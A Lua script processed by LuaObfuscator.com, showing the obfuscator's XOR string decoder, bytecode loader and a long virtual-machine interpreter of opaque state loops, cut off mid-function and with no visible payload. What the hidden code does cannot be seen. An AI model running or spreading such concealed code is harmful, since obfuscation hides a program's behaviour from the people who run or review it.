--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.9) ~  Much Love, Ferib 

]]--

do
	local v0 = string.char;
	local v1 = string.byte;
	local v2 = string.sub;
	local v3 = bit32 or bit;
	local v4 = v3.bxor;
	local v5 = table.concat;
	local v6 = table.insert;
	local function v7(v24, v25)
		local v26 = 0;
		local v27;
		while true do
			if (v26 == 1) then
				return v5(v27);
			end
			if (v26 == 0) then
				v27 = {};
				for v43 = 1, #v24 do
					v6(v27, v0(v4(v1(v2(v24, v43, v43 + 1)), v1(v2(v25, 1 + (v43 % #v25), 1 + (v43 % #v25) + 1))) % 256));
				end
				v26 = 1;
			end
		end
	end
	local v8 = tonumber;
	local v9 = string.byte;
	local v10 = string.char;
	local v11 = string.sub;
	local v12 = string.gsub;
	local v13 = string.rep;
	local v14 = table.concat;
	local v15 = table.insert;
	local v16 = math.ldexp;
	local v17 = getfenv or function()
		return _ENV;
	end;
	local v18 = setmetatable;
	local v19 = pcall;
	local v20 = select;
	local v21 = unpack or table.unpack;
	local v22 = tonumber;
	local function v23(v28, v29, ...)
		local v30 = 0;
		local v31;
		local v32;
		local v33;
		local v34;
		local v35;
		local v36;
		local v37;
		local v38;
		local v39;
		local v40;
		local v41;
		local v42;
		while true do
			if (v30 == 3) then
				function v37()
					local v44 = 0;
					local v45;
					local v46;
					local v47;
					local v48;
					local v49;
					local v50;
					local v51;
					while true do
						if (0 == v44) then
							v45 = 0;
							v46 = nil;
							v44 = 1;
						end
						if (v44 == 1) then
							v47 = nil;
							v48 = nil;
							v44 = 2;
						end
						if (v44 == 3) then
							v51 = nil;
							while true do
								local v99 = 0;
								while true do
									if (v99 == 1) then
										if (v45 == 1) then
											local v121 = 0;
											while true do
												if (v121 == 0) then
													v48 = 932 - (857 + 74);
													v49 = (v33(v47, 1, 588 - (367 + 201)) * (2 ^ 32)) + v46;
													v121 = 1;
												end
												if (v121 == 1) then
													v45 = 2;
													break;
												end
											end
										end
										if (3 == v45) then
											local v122 = 0;
											while true do
												if (v122 == 0) then
													if (v50 == 0) then
														if (v49 == 0) then
															return v51 * 0;
														else
															local v156 = 0;
															while true do
																if (v156 == 0) then
																	v50 = 1;
																	v48 = 0;
																	break;
																end
															end
														end
													elseif (v50 == 2047) then
														return ((v49 == (0 + 0)) and (v51 * (1 / 0))) or (v51 * NaN);
													end
													return v16(v51, v50 - 1023) * (v48 + (v49 / (2 ^ 52)));
												end
											end
										end
										break;
									end
									if (v99 == 0) then
										if (v45 == 2) then
											local v123 = 0;
											while true do
												if (v123 == 1) then
													v45 = 3;
													break;
												end
												if (v123 == 0) then
													v50 = v33(v47, 21, 958 - (214 + 713));
													v51 = ((v33(v47, 32) == 1) and -1) or 1;
													v123 = 1;
												end
											end
										end
										if (v45 == 0) then
											local v124 = 0;
											while true do
												if (v124 == 1) then
													v45 = 1;
													break;
												end
												if (v124 == 0) then
													v46 = v36();
													v47 = v36();
													v124 = 1;
												end
											end
										end
										v99 = 1;
									end
								end
							end
							break;
						end
						if (v44 == 2) then
							v49 = nil;
							v50 = nil;
							v44 = 3;
						end
					end
				end
				v38 = nil;
				function v38(v52)
					local v53 = 0;
					local v54;
					local v55;
					while true do
						if (v53 == 3) then
							return v14(v55);
						end
						if (v53 == 2) then
							v55 = {};
							for v100 = 1, #v54 do
								v55[v100] = v10(v9(v11(v54, v100, v100)));
							end
							v53 = 3;
						end
						if (v53 == 0) then
							v54 = nil;
							if not v52 then
								local v116 = 0;
								local v117;
								while true do
									if (0 == v116) then
										v117 = 0;
										while true do
											if (v117 == 0) then
												v52 = v36();
												if (v52 == 0) then
													return "";
												end
												break;
											end
										end
										break;
									end
								end
							end
							v53 = 1;
						end
						if (v53 == 1) then
							v54 = v11(v28, v31, (v31 + v52) - 1);
							v31 = v31 + v52;
							v53 = 2;
						end
					end
				end
				v39 = v36;
				v30 = 4;
			end
			if (v30 == 4) then
				v40 = nil;
				function v40(...)
					return {...}, v20("#", ...);
				end
				v41 = nil;
				function v41()
					local v56 = 0;
					local v57;
					local v58;
					local v59;
					local v60;
					local v61;
					local v62;
					while true do
						if (v56 == 0) then
							v57 = {};
							v58 = {};
							v59 = {};
							v56 = 1;
						end
						if (v56 == 2) then
							for v102 = 1 + 0, v61 do
								local v103 = 0;
								local v104;
								local v105;
								local v106;
								while true do
									if (v103 == 0) then
										v104 = 0;
										v105 = nil;
										v103 = 1;
									end
									if (v103 == 1) then
										v106 = nil;
										while true do
											if (v104 == 1) then
												if (v105 == 1) then
													v106 = v34() ~= 0;
												elseif (v105 == (2 - 0)) then
													v106 = v37();
												elseif (v105 == 3) then
													v106 = v38();
												end
												v62[v102] = v106;
												break;
											end
											if (v104 == 0) then
												local v130 = 0;
												while true do
													if (v130 == 1) then
														v104 = 1;
														break;
													end
													if (v130 == 0) then
														v105 = v34();
														v106 = nil;
														v130 = 1;
													end
												end
											end
										end
										break;
									end
								end
							end
							v60[3] = v34();
							for v107 = 1, v36() do
								local v108 = 0;
								local v109;
								local v110;
								while true do
									if (v108 == 0) then
										v109 = 0;
										v110 = nil;
										v108 = 1;
									end
									if (v108 == 1) then
										while true do
											if (v109 == 0) then
												v110 = v34();
												if (v33(v110, 1, 1) == 0) then
													local v133 = 0;
													local v134;
													local v135;
													local v136;
													local v137;
													while true do
														if (v133 == 1) then
															v136 = nil;
															v137 = nil;
															v133 = 2;
														end
														if (0 == v133) then
															v134 = 0;
															v135 = nil;
															v133 = 1;
														end
														if (2 == v133) then
															while true do
																if (0 == v134) then
																	local v159 = 0;
																	while true do
																		if (v159 == 1) then
																			v134 = 1;
																			break;
																		end
																		if (v159 == 0) then
																			v135 = v33(v110, 2, 3);
																			v136 = v33(v110, 4, 6);
																			v159 = 1;
																		end
																	end
																end
																if (1 == v134) then
																	local v160 = 0;
																	while true do
																		if (v160 == 0) then
																			v137 = {v35(),v35(),nil,nil};
																			if (v135 == 0) then
																				local v171 = 0;
																				local v172;
																				while true do
																					if (0 == v171) then
																						v172 = 0;
																						while true do
																							if (v172 == 0) then
																								v137[3] = v35();
																								v137[4] = v35();
																								break;
																							end
																						end
																						break;
																					end
																				end
																			elseif (v135 == 1) then
																				v137[3] = v36();
																			elseif (v135 == 2) then
																				v137[3] = v36() - (2 ^ (1081 - (68 + 997)));
																			elseif (v135 == 3) then
																				local v181 = 0;
																				local v182;
																				while true do
																					if (v181 == 0) then
																						v182 = 0;
																						while true do
																							if (v182 == 0) then
																								v137[3] = v36() - (2 ^ 16);
																								v137[1274 - (226 + 1044)] = v35();
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			v160 = 1;
																		end
																		if (v160 == 1) then
																			v134 = 2;
																			break;
																		end
																	end
																end
																if (v134 == 3) then
																	if (v33(v136, 3, 3) == 1) then
																		v137[4] = v62[v137[4]];
																	end
																	v57[v107] = v137;
																	break;
																end
																if (v134 == 2) then
																	local v162 = 0;
																	while true do
																		if (v162 == 1) then
																			v134 = 3;
																			break;
																		end
																		if (0 == v162) then
																			if (v33(v136, 1, 4 - 3) == 1) then
																				v137[2] = v62[v137[2]];
																			end
																			if (v33(v136, 2, 2) == 1) then
																				v137[3] = v62[v137[3]];
																			end
																			v162 = 1;
																		end
																	end
																end
															end
															break;
														end
													end
												end
												break;
											end
										end
										break;
									end
								end
							end
							v56 = 3;
						end
						if (3 == v56) then
							for v111 = 1, v36() do
								v58[v111 - 1] = v41();
							end
							return v60;
						end
						if (1 == v56) then
							v60 = {v57,v58,nil,v59};
							v61 = v36();
							v62 = {};
							v56 = 2;
						end
					end
				end
				v30 = 5;
			end
			if (v30 == 1) then
				function v33(v63, v64, v65)
					if v65 then
						local v87 = 0;
						local v88;
						local v89;
						while true do
							if (v87 == 0) then
								v88 = 0;
								v89 = nil;
								v87 = 1;
							end
							if (1 == v87) then
								while true do
									if (v88 == 0) then
										local v118 = 0;
										while true do
											if (v118 == 0) then
												v89 = (v63 / (2 ^ (v64 - 1))) % (2 ^ (((v65 - 1) - (v64 - 1)) + 1));
												return v89 - (v89 % 1);
											end
										end
									end
								end
								break;
							end
						end
					else
						local v90 = 0;
						local v91;
						local v92;
						while true do
							if (v90 == 0) then
								v91 = 0;
								v92 = nil;
								v90 = 1;
							end
							if (v90 == 1) then
								while true do
									if (v91 == 0) then
										local v119 = 0;
										while true do
											if (v119 == 0) then
												v92 = 2 ^ (v64 - 1);
												return (((v63 % (v92 + v92)) >= v92) and 1) or 0;
											end
										end
									end
								end
								break;
							end
						end
					end
				end
				v34 = nil;
				function v34()
					local v66 = 0;
					local v67;
					local v68;
					while true do
						if (v66 == 1) then
							while true do
								local v113 = 0;
								while true do
									if (v113 == 0) then
										if (v67 == 0) then
											local v125 = 0;
											while true do
												if (v125 == 0) then
													v68 = v9(v28, v31, v31);
													v31 = v31 + 1;
													v125 = 1;
												end
												if (v125 == 1) then
													v67 = 1;
													break;
												end
											end
										end
										if (v67 == 1) then
											return v68;
										end
										break;
									end
								end
							end
							break;
						end
						if (v66 == 0) then
							v67 = 0;
							v68 = nil;
							v66 = 1;
						end
					end
				end
				v35 = nil;
				v30 = 2;
			end
			if (v30 == 5) then
				v42 = nil;
				function v42(v69, v70, v71)
					local v72 = 0;
					local v73;
					local v74;
					local v75;
					local v76;
					while true do
						if (v72 == 1) then
							v75 = nil;
							v76 = nil;
							v72 = 2;
						end
						if (v72 == 2) then
							while true do
								local v114 = 0;
								while true do
									if (v114 == 0) then
										if (v73 == 1) then
											local v126 = 0;
											while true do
												if (v126 == 0) then
													v76 = v69[3];
													return function(...)
														local v141 = 0;
														local v142;
														local v143;
														local v144;
														local v145;
														local v146;
														local v147;
														local v148;
														local v149;
														local v150;
														local v151;
														local v152;
														local v153;
														local v154;
														local v155;
														while true do
															if (v141 == 1) then
																v145 = v40;
																v146 = 1;
																v147 = -1;
																v141 = 2;
															end
															if (v141 == 2) then
																v148 = {};
																v149 = {...};
																v150 = v20("#", ...) - 1;
																v141 = 3;
															end
															if (5 == v141) then
																while true do
																	local v157 = 0;
																	while true do
																		if (v157 == 0) then
																			v154 = v142[v146];
																			v155 = v154[1];
																			v157 = 1;
																		end
																		if (v157 == 1) then
																			if (v155 <= 17) then
																				if (v155 <= 8) then
																					if (v155 <= 3) then
																						if (v155 <= 1) then
																							if (v155 > 0) then
																								v152[v154[2]] = v152[v154[3]][v154[4]];
																							else
																								v152[v154[2]] = v70[v154[3]];
																							end
																						elseif (v155 == 2) then
																							local v187 = 0;
																							local v188;
																							local v189;
																							while true do
																								if (v187 == 1) then
																									while true do
																										if (v188 == 0) then
																											v189 = v154[2];
																											v152[v189] = v152[v189](v21(v152, v189 + 1, v147));
																											break;
																										end
																									end
																									break;
																								end
																								if (v187 == 0) then
																									v188 = 0;
																									v189 = nil;
																									v187 = 1;
																								end
																							end
																						else
																							v152[v154[2]][v154[3]] = v154[4];
																						end
																					elseif (v155 <= 5) then
																						if (v155 > 4) then
																							local v192 = 0;
																							local v193;
																							while true do
																								if (v192 == 0) then
																									v193 = 0;
																									while true do
																										if (v193 == 4) then
																											local v292 = 0;
																											while true do
																												if (v292 == 0) then
																													v152[v154[2]] = v71[v154[3]];
																													v146 = v146 + 1;
																													v292 = 1;
																												end
																												if (1 == v292) then
																													v154 = v142[v146];
																													v193 = 5;
																													break;
																												end
																											end
																										end
																										if (v193 == 7) then
																											if not v152[v154[2]] then
																												v146 = v146 + 1;
																											else
																												v146 = v154[3];
																											end
																											break;
																										end
																										if (v193 == 2) then
																											local v293 = 0;
																											while true do
																												if (v293 == 1) then
																													v154 = v142[v146];
																													v193 = 3;
																													break;
																												end
																												if (v293 == 0) then
																													v152[v154[119 - (32 + 85)]] = v71[v154[3]];
																													v146 = v146 + 1 + 0;
																													v293 = 1;
																												end
																											end
																										end
																										if (v193 == 5) then
																											local v294 = 0;
																											while true do
																												if (v294 == 1) then
																													v154 = v142[v146];
																													v193 = 6;
																													break;
																												end
																												if (v294 == 0) then
																													v152[v154[2]] = v152[v154[3]][v154[4]];
																													v146 = v146 + 1;
																													v294 = 1;
																												end
																											end
																										end
																										if (v193 == 6) then
																											local v295 = 0;
																											while true do
																												if (v295 == 1) then
																													v154 = v142[v146];
																													v193 = 7;
																													break;
																												end
																												if (v295 == 0) then
																													v152[v154[2]] = v71[v154[960 - (892 + 65)]];
																													v146 = v146 + 1;
																													v295 = 1;
																												end
																											end
																										end
																										if (v193 == 3) then
																											local v296 = 0;
																											while true do
																												if (v296 == 0) then
																													v152[v154[2]] = v152[v154[3]][v154[4]];
																													v146 = v146 + 1 + 0;
																													v296 = 1;
																												end
																												if (v296 == 1) then
																													v154 = v142[v146];
																													v193 = 4;
																													break;
																												end
																											end
																										end
																										if (v193 == 0) then
																											local v297 = 0;
																											while true do
																												if (v297 == 1) then
																													v154 = v142[v146];
																													v193 = 1;
																													break;
																												end
																												if (v297 == 0) then
																													v152[v154[2]] = v71[v154[3]];
																													v146 = v146 + 1;
																													v297 = 1;
																												end
																											end
																										end
																										if (v193 == 1) then
																											local v298 = 0;
																											while true do
																												if (v298 == 0) then
																													v152[v154[2]] = v152[v154[3]][v154[4]];
																													v146 = v146 + 1;
																													v298 = 1;
																												end
																												if (v298 == 1) then
																													v154 = v142[v146];
																													v193 = 2;
																													break;
																												end
																											end
																										end
																									end
																									break;
																								end
																							end
																						else
																							local v194 = 0;
																							local v195;
																							local v196;
																							local v197;
																							local v198;
																							local v199;
																							while true do
																								if (0 == v194) then
																									v195 = 0;
																									v196 = nil;
																									v194 = 1;
																								end
																								if (2 == v194) then
																									v199 = nil;
																									while true do
																										if (v195 == 7) then
																											local v299 = 0;
																											while true do
																												if (v299 == 2) then
																													v146 = v146 + 1;
																													v154 = v142[v146];
																													v299 = 3;
																												end
																												if (v299 == 0) then
																													v152[v154[5 - 3]] = #v152[v154[3]];
																													v146 = v146 + 1;
																													v299 = 1;
																												end
																												if (v299 == 3) then
																													v152[v154[2]] = v154[3] + v152[v154[4]];
																													v146 = v146 + 1;
																													v299 = 4;
																												end
																												if (v299 == 1) then
																													v154 = v142[v146];
																													v152[v154[2]] = v152[v154[3]] % v152[v154[4]];
																													v299 = 2;
																												end
																												if (v299 == 4) then
																													v195 = 8;
																													break;
																												end
																											end
																										end
																										if (3 == v195) then
																											local v300 = 0;
																											while true do
																												if (v300 == 0) then
																													v152[v154[2]] = v152[v154[353 - (87 + 263)]] + v154[4];
																													v146 = v146 + 1;
																													v300 = 1;
																												end
																												if (v300 == 3) then
																													v196 = 0;
																													for v533 = v199, v147 do
																														local v534 = 0;
																														local v535;
																														while true do
																															if (v534 == 0) then
																																v535 = 0;
																																while true do
																																	if (v535 == 0) then
																																		v196 = v196 + 1 + 0;
																																		v152[v533] = v197[v196];
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																													end
																													v300 = 4;
																												end
																												if (v300 == 2) then
																													v197, v198 = v145(v152[v199](v21(v152, v199 + 1, v154[3])));
																													v147 = (v198 + v199) - (181 - (67 + 113));
																													v300 = 3;
																												end
																												if (4 == v300) then
																													v195 = 4;
																													break;
																												end
																												if (v300 == 1) then
																													v154 = v142[v146];
																													v199 = v154[2];
																													v300 = 2;
																												end
																											end
																										end
																										if (v195 == 0) then
																											local v301 = 0;
																											while true do
																												if (v301 == 2) then
																													v146 = v146 + 1;
																													v154 = v142[v146];
																													v301 = 3;
																												end
																												if (v301 == 0) then
																													v196 = nil;
																													v197, v198 = nil;
																													v301 = 1;
																												end
																												if (3 == v301) then
																													v152[v154[2]] = v70[v154[7 - 4]];
																													v146 = v146 + 1;
																													v301 = 4;
																												end
																												if (4 == v301) then
																													v195 = 1;
																													break;
																												end
																												if (v301 == 1) then
																													v199 = nil;
																													v152[v154[2]] = v152[v154[3]];
																													v301 = 2;
																												end
																											end
																										end
																										if (12 == v195) then
																											v199 = v154[2];
																											v152[v199](v21(v152, v199 + 1, v147));
																											break;
																										end
																										if (v195 == 8) then
																											local v303 = 0;
																											while true do
																												if (v303 == 3) then
																													v147 = (v198 + v199) - 1;
																													v196 = 0;
																													v303 = 4;
																												end
																												if (v303 == 1) then
																													v146 = v146 + 1 + 0;
																													v154 = v142[v146];
																													v303 = 2;
																												end
																												if (v303 == 0) then
																													v154 = v142[v146];
																													v152[v154[3 - 1]] = v152[v154[3]] + v154[4];
																													v303 = 1;
																												end
																												if (v303 == 2) then
																													v199 = v154[2];
																													v197, v198 = v145(v152[v199](v21(v152, v199 + 1, v154[3])));
																													v303 = 3;
																												end
																												if (v303 == 4) then
																													v195 = 9;
																													break;
																												end
																											end
																										end
																										if (v195 == 10) then
																											local v304 = 0;
																											while true do
																												if (v304 == 1) then
																													v199 = v154[2];
																													v152[v199] = v152[v199](v21(v152, v199 + 1, v147));
																													v304 = 2;
																												end
																												if (4 == v304) then
																													v195 = 11;
																													break;
																												end
																												if (v304 == 2) then
																													v146 = v146 + 1;
																													v154 = v142[v146];
																													v304 = 3;
																												end
																												if (v304 == 3) then
																													v152[v154[2]] = v152[v154[3]] % v154[4];
																													v146 = v146 + 1;
																													v304 = 4;
																												end
																												if (v304 == 0) then
																													v146 = v146 + 1;
																													v154 = v142[v146];
																													v304 = 1;
																												end
																											end
																										end
																										if (v195 == 11) then
																											local v305 = 0;
																											while true do
																												if (v305 == 0) then
																													v154 = v142[v146];
																													v199 = v154[2];
																													v305 = 1;
																												end
																												if (1 == v305) then
																													v197, v198 = v145(v152[v199](v152[v199 + (2 - 1)]));
																													v147 = (v198 + v199) - 1;
																													v305 = 2;
																												end
																												if (v305 == 2) then
																													v196 = 0;
																													for v536 = v199, v147 do
																														local v537 = 0;
																														local v538;
																														while true do
																															if (0 == v537) then
																																v538 = 0;
																																while true do
																																	if (v538 == 0) then
																																		v196 = v196 + 1;
																																		v152[v536] = v197[v196];
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																													end
																													v305 = 3;
																												end
																												if (v305 == 3) then
																													v146 = v146 + 1;
																													v154 = v142[v146];
																													v305 = 4;
																												end
																												if (v305 == 4) then
																													v195 = 12;
																													break;
																												end
																											end
																										end
																										if (v195 == 9) then
																											local v306 = 0;
																											while true do
																												if (v306 == 2) then
																													v197, v198 = v145(v152[v199](v21(v152, v199 + 1, v147)));
																													v147 = (v198 + v199) - 1;
																													v306 = 3;
																												end
																												if (v306 == 4) then
																													v195 = 10;
																													break;
																												end
																												if (v306 == 1) then
																													v154 = v142[v146];
																													v199 = v154[2];
																													v306 = 2;
																												end
																												if (v306 == 0) then
																													for v539 = v199, v147 do
																														local v540 = 0;
																														local v541;
																														while true do
																															if (v540 == 0) then
																																v541 = 0;
																																while true do
																																	if (v541 == 0) then
																																		v196 = v196 + (998 - (915 + 82));
																																		v152[v539] = v197[v196];
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																													end
																													v146 = v146 + 1;
																													v306 = 1;
																												end
																												if (3 == v306) then
																													v196 = 0;
																													for v542 = v199, v147 do
																														local v543 = 0;
																														local v544;
																														while true do
																															if (0 == v543) then
																																v544 = 0;
																																while true do
																																	if (v544 == 0) then
																																		v196 = v196 + 1;
																																		v152[v542] = v197[v196];
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																													end
																													v306 = 4;
																												end
																											end
																										end
																										if (5 == v195) then
																											local v307 = 0;
																											while true do
																												if (v307 == 1) then
																													v146 = v146 + 1;
																													v154 = v142[v146];
																													v307 = 2;
																												end
																												if (v307 == 2) then
																													v152[v154[2]] = v152[v154[3]];
																													v146 = v146 + 1;
																													v307 = 3;
																												end
																												if (v307 == 4) then
																													v195 = 6;
																													break;
																												end
																												if (v307 == 0) then
																													v154 = v142[v146];
																													v152[v154[4 - 2]] = v70[v154[3]];
																													v307 = 1;
																												end
																												if (v307 == 3) then
																													v154 = v142[v146];
																													v152[v154[2]] = #v152[v154[3]];
																													v307 = 4;
																												end
																											end
																										end
																										if (2 == v195) then
																											local v308 = 0;
																											while true do
																												if (v308 == 2) then
																													v154 = v142[v146];
																													v152[v154[3 - 1]] = v152[v154[3]];
																													v308 = 3;
																												end
																												if (v308 == 1) then
																													v152[v154[2]] = v152[v154[3]];
																													v146 = v146 + 1;
																													v308 = 2;
																												end
																												if (v308 == 3) then
																													v146 = v146 + 1;
																													v154 = v142[v146];
																													v308 = 4;
																												end
																												if (v308 == 4) then
																													v195 = 3;
																													break;
																												end
																												if (v308 == 0) then
																													v146 = v146 + 1;
																													v154 = v142[v146];
																													v308 = 1;
																												end
																											end
																										end
																										if (v195 == 1) then
																											local v309 = 0;
																											while true do
																												if (v309 == 3) then
																													v154 = v142[v146];
																													v152[v154[2]] = v70[v154[3]];
																													v309 = 4;
																												end
																												if (v309 == 0) then
																													v154 = v142[v146];
																													v152[v154[2]] = v70[v154[3]];
																													v309 = 1;
																												end
																												if (v309 == 1) then
																													v146 = v146 + 1;
																													v154 = v142[v146];
																													v309 = 2;
																												end
																												if (v309 == 2) then
																													v152[v154[2]] = v70[v154[5 - 2]];
																													v146 = v146 + 1;
																													v309 = 3;
																												end
																												if (v309 == 4) then
																													v195 = 2;
																													break;
																												end
																											end
																										end
																										if (6 == v195) then
																											local v310 = 0;
																											while true do
																												if (v310 == 1) then
																													v152[v154[2]] = v152[v154[3]] % v152[v154[3 + 1]];
																													v146 = v146 + 1;
																													v310 = 2;
																												end
																												if (v310 == 2) then
																													v154 = v142[v146];
																													v152[v154[2]] = v154[3] + v152[v154[15 - 11]];
																													v310 = 3;
																												end
																												if (v310 == 3) then
																													v146 = v146 + (953 - (802 + 150));
																													v154 = v142[v146];
																													v310 = 4;
																												end
																												if (v310 == 4) then
																													v195 = 7;
																													break;
																												end
																												if (v310 == 0) then
																													v146 = v146 + 1;
																													v154 = v142[v146];
																													v310 = 1;
																												end
																											end
																										end
																										if (v195 == 4) then
																											local v311 = 0;
																											while true do
																												if (v311 == 4) then
																													v195 = 5;
																													break;
																												end
																												if (v311 == 3) then
																													v152[v154[2]] = v70[v154[3]];
																													v146 = v146 + 1;
																													v311 = 4;
																												end
																												if (v311 == 1) then
																													v199 = v154[2];
																													v152[v199] = v152[v199](v21(v152, v199 + 1, v147));
																													v311 = 2;
																												end
																												if (v311 == 2) then
																													v146 = v146 + 1;
																													v154 = v142[v146];
																													v311 = 3;
																												end
																												if (0 == v311) then
																													v146 = v146 + 1;
																													v154 = v142[v146];
																													v311 = 1;
																												end
																											end
																										end
																									end
																									break;
																								end
																								if (v194 == 1) then
																									v197 = nil;
																									v198 = nil;
																									v194 = 2;
																								end
																							end
																						end
																					elseif (v155 <= 6) then
																						local v200 = 0;
																						local v201;
																						local v202;
																						local v203;
																						local v204;
																						while true do
																							if (v200 == 0) then
																								v201 = 0;
																								v202 = nil;
																								v200 = 1;
																							end
																							if (v200 == 1) then
																								v203 = nil;
																								v204 = nil;
																								v200 = 2;
																							end
																							if (v200 == 2) then
																								while true do
																									if (v201 == 0) then
																										local v312 = 0;
																										while true do
																											if (v312 == 1) then
																												v201 = 1;
																												break;
																											end
																											if (v312 == 0) then
																												v202 = v154[2];
																												v203 = v152[v202 + 2];
																												v312 = 1;
																											end
																										end
																									end
																									if (v201 == 2) then
																										if (v203 > 0) then
																											if (v204 <= v152[v202 + 1]) then
																												local v545 = 0;
																												local v546;
																												while true do
																													if (v545 == 0) then
																														v546 = 0;
																														while true do
																															if (v546 == 0) then
																																v146 = v154[3];
																																v152[v202 + 3] = v204;
																																break;
																															end
																														end
																														break;
																													end
																												end
																											end
																										elseif (v204 >= v152[v202 + 1]) then
																											local v547 = 0;
																											local v548;
																											while true do
																												if (v547 == 0) then
																													v548 = 0;
																													while true do
																														if (v548 == 0) then
																															v146 = v154[3];
																															v152[v202 + 3] = v204;
																															break;
																														end
																													end
																													break;
																												end
																											end
																										end
																										break;
																									end
																									if (v201 == 1) then
																										local v313 = 0;
																										while true do
																											if (v313 == 0) then
																												v204 = v152[v202] + v203;
																												v152[v202] = v204;
																												v313 = 1;
																											end
																											if (v313 == 1) then
																												v201 = 2;
																												break;
																											end
																										end
																									end
																								end
																								break;
																							end
																						end
																					elseif (v155 == 7) then
																						local v254 = 0;
																						local v255;
																						local v256;
																						local v257;
																						local v258;
																						local v259;
																						while true do
																							if (v254 == 1) then
																								v257 = nil;
																								v258 = nil;
																								v254 = 2;
																							end
																							if (v254 == 0) then
																								v255 = 0;
																								v256 = nil;
																								v254 = 1;
																							end
																							if (v254 == 2) then
																								v259 = nil;
																								while true do
																									if (v255 == 0) then
																										local v356 = 0;
																										while true do
																											if (v356 == 1) then
																												v255 = 1;
																												break;
																											end
																											if (v356 == 0) then
																												v256 = v154[2 + 0];
																												v257, v258 = v145(v152[v256](v21(v152, v256 + 1, v154[3])));
																												v356 = 1;
																											end
																										end
																									end
																									if (v255 == 1) then
																										local v357 = 0;
																										while true do
																											if (v357 == 1) then
																												v255 = 2;
																												break;
																											end
																											if (v357 == 0) then
																												v147 = (v258 + v256) - 1;
																												v259 = 0;
																												v357 = 1;
																											end
																										end
																									end
																									if (v255 == 2) then
																										for v455 = v256, v147 do
																											local v456 = 0;
																											local v457;
																											while true do
																												if (v456 == 0) then
																													v457 = 0;
																													while true do
																														if (v457 == 0) then
																															v259 = v259 + 1;
																															v152[v455] = v257[v259];
																															break;
																														end
																													end
																													break;
																												end
																											end
																										end
																										break;
																									end
																								end
																								break;
																							end
																						end
																					elseif not v152[v154[2 - 0]] then
																						v146 = v146 + 1;
																					else
																						v146 = v154[3];
																					end
																				elseif (v155 <= 12) then
																					if (v155 <= 10) then
																						if (v155 == (1196 - (1069 + 118))) then
																							v152[v154[4 - 2]] = v154[6 - 3];
																						else
																							local v207 = 0;
																							local v208;
																							local v209;
																							local v210;
																							local v211;
																							while true do
																								if (v207 == 0) then
																									v208 = 0;
																									v209 = nil;
																									v207 = 1;
																								end
																								if (v207 == 2) then
																									while true do
																										if (v208 == 1) then
																											v211 = v152[v209 + 2];
																											if (v211 > 0) then
																												if (v210 > v152[v209 + 1]) then
																													v146 = v154[1 + 2];
																												else
																													v152[v209 + 3] = v210;
																												end
																											elseif (v210 < v152[v209 + 1]) then
																												v146 = v154[3];
																											else
																												v152[v209 + 3] = v210;
																											end
																											break;
																										end
																										if (v208 == 0) then
																											local v315 = 0;
																											while true do
																												if (v315 == 1) then
																													v208 = 1;
																													break;
																												end
																												if (0 == v315) then
																													v209 = v154[2];
																													v210 = v152[v209];
																													v315 = 1;
																												end
																											end
																										end
																									end
																									break;
																								end
																								if (v207 == 1) then
																									v210 = nil;
																									v211 = nil;
																									v207 = 2;
																								end
																							end
																						end
																					elseif (v155 > 11) then
																						v71[v154[3]] = v152[v154[2]];
																					else
																						local v214 = 0;
																						local v215;
																						local v216;
																						while true do
																							if (1 == v214) then
																								while true do
																									if (v215 == 6) then
																										local v316 = 0;
																										while true do
																											if (1 == v316) then
																												v71[v154[3]] = v152[v154[2]];
																												v215 = 7;
																												break;
																											end
																											if (0 == v316) then
																												v146 = v146 + 1;
																												v154 = v142[v146];
																												v316 = 1;
																											end
																										end
																									end
																									if (2 == v215) then
																										local v317 = 0;
																										while true do
																											if (0 == v317) then
																												v154 = v142[v146];
																												v152[v154[2]] = v154[3];
																												v317 = 1;
																											end
																											if (1 == v317) then
																												v146 = v146 + 1;
																												v215 = 3;
																												break;
																											end
																										end
																									end
																									if (v215 == 5) then
																										local v318 = 0;
																										while true do
																											if (0 == v318) then
																												v146 = v146 + 1;
																												v154 = v142[v146];
																												v318 = 1;
																											end
																											if (v318 == 1) then
																												v152[v154[2]] = v154[3];
																												v215 = 6;
																												break;
																											end
																										end
																									end
																									if (8 == v215) then
																										local v319 = 0;
																										while true do
																											if (v319 == 1) then
																												v152[v154[2]] = v154[21 - (10 + 8)];
																												v215 = 9;
																												break;
																											end
																											if (0 == v319) then
																												v146 = v146 + (3 - 2);
																												v154 = v142[v146];
																												v319 = 1;
																											end
																										end
																									end
																									if (v215 == 0) then
																										local v320 = 0;
																										while true do
																											if (v320 == 0) then
																												v216 = nil;
																												v152[v154[2]] = v152[v154[3]];
																												v320 = 1;
																											end
																											if (v320 == 1) then
																												v146 = v146 + 1;
																												v215 = 1;
																												break;
																											end
																										end
																									end
																									if (v215 == 4) then
																										local v321 = 0;
																										while true do
																											if (v321 == 0) then
																												v146 = v146 + 1;
																												v154 = v142[v146];
																												v321 = 1;
																											end
																											if (v321 == 1) then
																												v71[v154[3]] = v152[v154[2]];
																												v215 = 5;
																												break;
																											end
																										end
																									end
																									if (v215 == 1) then
																										local v322 = 0;
																										while true do
																											if (v322 == 1) then
																												v146 = v146 + 1;
																												v215 = 2;
																												break;
																											end
																											if (v322 == 0) then
																												v154 = v142[v146];
																												v152[v154[3 - 1]] = v154[3];
																												v322 = 1;
																											end
																										end
																									end
																									if (v215 == 9) then
																										v146 = v146 + (3 - 2);
																										v154 = v142[v146];
																										v152[v154[2]] = v154[445 - (416 + 26)];
																										break;
																									end
																									if (v215 == 3) then
																										local v326 = 0;
																										while true do
																											if (v326 == 1) then
																												v152[v216] = v152[v216](v21(v152, v216 + 1, v154[3]));
																												v215 = 4;
																												break;
																											end
																											if (v326 == 0) then
																												v154 = v142[v146];
																												v216 = v154[2 + 0];
																												v326 = 1;
																											end
																										end
																									end
																									if (v215 == 7) then
																										local v327 = 0;
																										while true do
																											if (0 == v327) then
